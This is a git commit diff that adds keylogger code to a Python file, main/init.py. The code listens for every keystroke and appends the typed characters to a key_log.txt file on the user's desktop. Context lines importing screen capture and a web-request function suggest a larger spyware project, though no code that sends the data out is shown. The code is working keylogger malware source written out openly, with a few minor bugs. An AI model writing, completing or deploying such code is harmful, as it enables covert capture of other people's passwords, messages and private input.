4f67207190a62d519f6cf5a665848eabb65e603c
Eric <36511146+eeric92@users.noreply.github.com>
2021-05-02 11:06:43 +0200

    commit 2

--- main/init.py
+++ main/init.py
@@ -26,3 +26,45 @@ from requests import get
 
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+
+file_path = "C:\\Users\\eeric\\Desktop"
+extend = "\\"
+
+count = 0
+keys = []
+
+
+def on_press(key):
+    global keys, count
+
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if (k.find("space")) > 0:
+                f.write("\n")
+                f.close
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+# with Listener(on_press(on_press), on_release(on_release)) as listener:
+    listener.join()
+
